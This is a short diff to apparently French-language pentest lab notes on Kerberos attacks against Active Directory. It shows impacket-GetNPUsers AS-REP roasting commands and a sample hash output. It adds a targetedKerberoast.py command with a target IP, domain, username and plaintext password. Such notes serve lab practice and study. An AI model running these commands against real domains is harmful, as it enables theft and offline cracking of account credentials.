@@ -34,6 +34,12 @@ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile valid_users.txt -dc-ip 10
 impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -request
 # la sortie intéressante
 $krb5asrep$23$user@DOMAIN:...
+
+```
+
+ref : 
+```
+python3 targetedKerberoast.py --dc-ip 10.129.41.212 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' 
 ```
 
 ```bash 
